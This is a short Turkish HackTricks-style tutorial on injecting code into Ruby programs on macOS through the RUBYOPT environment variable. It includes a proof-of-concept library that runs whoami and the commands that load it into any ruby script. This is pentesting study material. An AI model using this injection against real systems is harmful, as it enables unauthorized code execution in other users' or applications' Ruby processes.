# macOS Ruby Uygulamaları Enjeksiyonu

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Bu ortam değişkenini kullanarak **ruby** her çalıştırıldığında **yeni parametreler eklemek** mümkündür. Ancak **`-e`** parametresi çalıştırılacak ruby kodunu belirtmek için kullanılamaz, bununla birlikte **`-I`** ve **`-r`** parametrelerini kullanarak yükleme yolu için yeni bir klasör eklemek ve ardından **yüklemek için bir kütüphane belirtmek** mümkündür.

**`/tmp`** dizininde **`inject.rb`** kütüphanesini oluşturun:
```ruby:inject.rb
puts `whoami`
```
Herhangi bir yerde aşağıdaki gibi bir ruby betiği oluşturun:
```ruby:hello.rb
puts 'Hello, World!'
```
Arbitrary bir ruby betiği ile yükleyin:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Eğlenceli bir gerçek, **`--disable-rubyopt`** parametresi ile bile çalışıyor:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
